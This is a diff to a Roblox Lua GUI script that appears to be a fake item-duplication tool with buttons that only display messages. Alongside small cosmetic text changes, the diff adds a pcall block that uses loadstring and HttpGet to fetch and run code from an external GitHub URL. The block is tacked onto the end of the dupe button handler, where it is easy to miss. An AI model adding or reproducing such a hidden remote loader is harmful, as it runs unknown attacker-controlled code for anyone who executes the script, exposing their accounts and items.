@@ -201,14 +201,16 @@ end
 -- Button logic
 dupeBtn.MouseButton1Click:Connect(function()
 	showMessage("🌀 Duplicating the vibes...", Color3.fromRGB(120,170,255))
-end)
+end)pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"))()
+		end)
 
 eventBtn.MouseButton1Click:Connect(function()
 	showMessage("🎉 Event Added Successfully!", Color3.fromRGB(255,255,0))
 end)
 
 spawnBtn.MouseButton1Click:Connect(function()
-	showMessage("🧠 Spawning Brainrot Energy 💥", Color3.fromRGB(255,100,100))
+	showMessage("🧠 Spawning Brainrot 💥", Color3.fromRGB(255,100,100))
 end)
 
 -- Send Link: progress + Done + Sound
@@ -217,7 +219,7 @@ linkBtn.MouseButton1Click:Connect(function()
 	task.wait(0.4)
 
 	progressContainer.Visible = true
-	progressText.Text = "Sending Link..."
+	progressText.Text = "Sending Link...Done"
 	barFill.Size = UDim2.new(0, 0, 1, 0)
 
 	local duration = 10
